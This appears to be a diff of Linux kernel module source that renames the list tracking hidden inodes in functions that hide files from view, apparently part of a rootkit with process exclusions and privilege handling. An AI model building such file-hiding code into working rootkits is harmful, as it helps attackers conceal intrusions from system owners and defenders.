@@ -6,7 +6,7 @@
 #include "service.h"
 #include "privileges.h"
 
-LIST_HEAD(inodes_to_hide);
+LIST_HEAD(hidden_inodes);
 
 void hide_file_inode(unsigned long ino)
 {
@@ -23,7 +23,7 @@ void hide_file_inode(unsigned long ino)
 
     inode_entry->ino = ino;
     INIT_LIST_HEAD(&inode_entry->excluded_pids);
-    list_add_tail(&inode_entry->list, &inodes_to_hide);
+    list_add_tail(&inode_entry->list, &hidden_inodes);
 }
 
 int should_hide_inode(unsigned long ino)
@@ -33,7 +33,7 @@ int should_hide_inode(unsigned long ino)
     int current_pid;
 
     // check if inode is hidden
-    list_for_each_entry(inode_entry, &inodes_to_hide, list) {
+    list_for_each_entry(inode_entry, &hidden_inodes, list) {
         if (inode_entry->ino == ino) {
             hidden_inode = inode_entry;
             break;
@@ -68,7 +68,7 @@ void show_file_inode(const void __user *user_info)
     }
 
     // search for requested inode
-    list_for_each_entry(entry, &inodes_to_hide, list) {
+    list_for_each_entry(entry, &hidden_inodes, list) {
         if (entry->ino == info.ino)
             hidden_inode = entry;
     }
